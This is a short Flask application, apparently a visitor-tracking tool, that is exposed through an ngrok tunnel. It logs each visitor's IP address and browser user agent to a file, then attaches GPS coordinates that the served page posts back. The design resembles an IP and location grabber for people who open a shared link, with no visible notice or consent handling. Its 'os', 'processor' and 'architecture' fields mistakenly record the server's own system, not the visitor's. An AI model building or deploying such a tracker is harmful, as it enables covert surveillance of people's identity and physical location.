from flask import Flask, request, render_template, jsonify
import platform
import json
from ngrok_manager import start_ngrok  

app = Flask(__name__, template_folder='templates')

@app.route('/')
def home():
    
    visitor_data = {
        'ip_address': request.headers.get('X-Forwarded-For', request.remote_addr),
        'user_agent': request.user_agent.string,
        'os': platform.system(),
        'processor': platform.processor(),
        'architecture': platform.architecture()[0],
        'gps_coordinates': None  
    }
    
    with open('output_log.txt', 'a') as file:
        file.write(json.dumps(visitor_data) + '\n')
    
    return render_template('index.html')

@app.route('/log_location', methods=['POST'])
def log_location():
    location_data = request.json
    
    with open('output_log.txt', 'r+') as file:
        lines = file.readlines()
        last_line = json.loads(lines[-1])
        if 'gps_coordinates' in last_line and last_line['gps_coordinates'] is None:
            last_line['gps_coordinates'] = {
                'latitude': location_data['latitude'],
                'longitude': location_data['longitude']
            }
            lines[-1] = json.dumps(last_line) + '\n'  
            file.seek(0)
            file.writelines(lines)  
    return jsonify(status='success')

if __name__ == '__main__':
    start_ngrok()
    app.run(debug=True, port=5000)
